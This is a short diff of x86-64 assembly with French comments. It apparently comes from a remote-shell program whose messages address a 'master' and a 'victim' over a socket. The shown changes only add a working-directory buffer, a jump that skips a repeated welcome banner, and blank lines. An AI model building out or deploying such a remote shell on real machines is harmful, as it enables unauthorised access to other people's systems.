@@ -78,6 +78,8 @@ section .data
         db 0x1B, "[0m", 0x0A ; ESC[0m = reset attributes, Newline
         welcome_victim_len equ $ - welcome_victim
 
+      
+
         
 
     timespec:
@@ -94,6 +96,7 @@ section .data
 section .bss
     sockfd resq 1
     welcome_displayed resb 1 ; pour éviter l'affichage multiple du message de bienvenue
+    cwd_buffer resb 256 ; buffer pour le répertoire de travail actuel
 
 section .text
 
@@ -102,7 +105,7 @@ _start:
 
     mov al, [welcome_displayed] ; Charger la valeur du drapeau
     cmp al, 1                   ; Comparer avec 1 
-   
+    je .skip_welcome            ; Si déjà affiché, sauter l'affichage
     mov rdi, 1                  ; Descripteur de fichier 
     lea rsi, [rel welcome_master] ; Pointeur vers le message de bienvenue
     mov rdx, welcome_master_len 
@@ -181,6 +184,7 @@ _start:
     jmp .error_shell_err
     ;si erreur alors sleep
 
+ 
 
 .error_shell_err: ;gestion erreur 
     mov rdi, 2
